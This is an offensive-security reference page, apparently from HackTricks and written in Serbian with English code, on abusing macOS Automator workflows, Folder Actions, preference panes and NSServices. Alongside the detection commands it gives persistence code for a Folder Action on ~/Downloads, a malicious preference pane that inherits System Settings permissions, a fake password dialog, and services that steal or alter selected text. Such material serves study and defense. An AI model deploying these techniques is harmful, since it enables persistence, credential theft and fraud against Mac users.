# macOS Automator, Preference Panes & NSServices zloupotreba

{{#include ../../../banners/hacktricks-training.md}}

## Automator Akcije i Tokovi rada

### Osnovne informacije

**Automator** je vizuelni alat za automatizaciju macOS-a. Izvršava **workflows** (`.workflow` bundles) sastavljene od **actions** (`.action` bundles). Automator takođe pokreće **Folder Actions**, **Quick Actions**, i integraciju sa **Shortcuts**.

Automator actions su **pluginovi** učitani u Automator runtime kada se workflow izvršava. Oni mogu:
- Izvršavati proizvoljne shell skripte
- Obraditi fajlove i podatke
- Komunicirati sa aplikacijama putem AppleScript
- Povezivati se u lanac za kompleksnu automatizaciju

### Zašto je ovo važno

> [!WARNING]
> Automator workflows mogu biti pokrenuti socijalnim inženjeringom — pojavljuju se kao obični dokument fajlovi. `.workflow` bundle može sadržati ugrađene shell komande koje se izvršavaju kada se workflow pokrene. U kombinaciji sa Folder Actions, obezbeđuju **automatsku perzistenciju** koja se aktivira na događaje vezane za fajlove.

### Otkrivanje
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

Većini korisnika `.workflow` paket izgleda kao obična datoteka:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Napad: Folder Action Persistence

Folder Actions automatski izvršavaju workflow kada se u praćeni folder dodaju datoteke:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions ostaju aktivne nakon restartovanja i izvršavaju se neprimetno. Folder Action na `~/Downloads` znači da **svaki preuzeti fajl pokreće vaš payload** — uključujući fajlove iz Safari, Chrome, AirDrop, i email priloga.

---

## Paneli podešavanja

### Osnovne informacije

Paneli podešavanja (`.prefPane` bundles) su pluginovi učitani u **System Settings** (ranije System Preferences). Oni obezbeđuju panele korisničkog interfejsa za konfiguraciju sistemskih ili aplikacija trećih strana.

### Zašto je ovo važno

- Paneli podešavanja se izvršavaju unutar **System Settings process**, koji može imati **elevated TCC permissions** (accessibility, full disk access u nekim kontekstima)
- Paneli podešavanja trećih strana se učitavaju u ovaj poverljivi proces, **nasleđujući njegov sigurnosni kontekst**
- Korisnici instaliraju panele podešavanja dvostrukim klikom — olakšava socijalni inženjering
- Kada su instalirani, oni **ostaju** i učitavaju se svaki put kada se System Settings otvori na tom panelu

### Otkrivanje
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

Maliciozan preference pane nasleđuje sigurnosni kontekst System Settings:
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside System Settings process
// It has System Settings' TCC permissions

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Napad: Persistence putem instalacije
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Napad: UI Phishing

Preference pane može da oponaša legitimne sistemske UI panele kako bi **phish for credentials**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Osnovne informacije

**NSServices** omogućavaju aplikacijama da pruže funkcionalnost drugim aplikacijama preko **Services menu** (desni klik → Services). Kada korisnik označi tekst ili podatke i pozove servis, označeni podaci se **šalju pružaocu servisa** na obradu.

Servisi se deklarišu u `Info.plist` aplikacije pod `NSServices` ključem i registruju kod pasteboard servera (`pbs`).

### Zašto je ovo važno

- Services primaju **tok podataka između aplikacija** — označeni tekst iz bilo koje aplikacije se šalje servisu
- Zlonameran servis može da presretne podatke iz menadžera lozinki, email klijenata i finansijskih aplikacija
- Services mogu da **vrate izmenjene podatke** nazad aplikaciji koja je pozvala (man-in-the-middle na operacijama selekcije)
- Imena servisa mogu biti konstruisana da deluju legitimno ("Format Text", "Encrypt Selection", "Share")

### Otkrivanje
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Napad: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Napad: Modifikacija podataka (Man-in-the-Middle)

Servis može **izmeniti vraćene podatke** dok izgleda da obavlja legitimnu funkciju:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
---

## Međutehnički lanci napada

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Panel preferencija → TCC Eskalacija
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane runs inside System Settings context
4. Inherits System Settings' TCC grants
5. Access protected data, control other apps via inherited Accessibility
```
### NSService → Krađa menadžera lozinki
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Izvori

* [Apple Developer — Automator Programming Guide](https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/AutomatorConcepts/Automator.html)
* [Apple Developer — Preference Pane Programming Guide](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/PreferencePanes/Introduction/Introduction.html)
* [Apple Developer — Services Implementation Guide](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/SysServices/introduction.html)
* [Objective-See — Folder Action Persistence](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
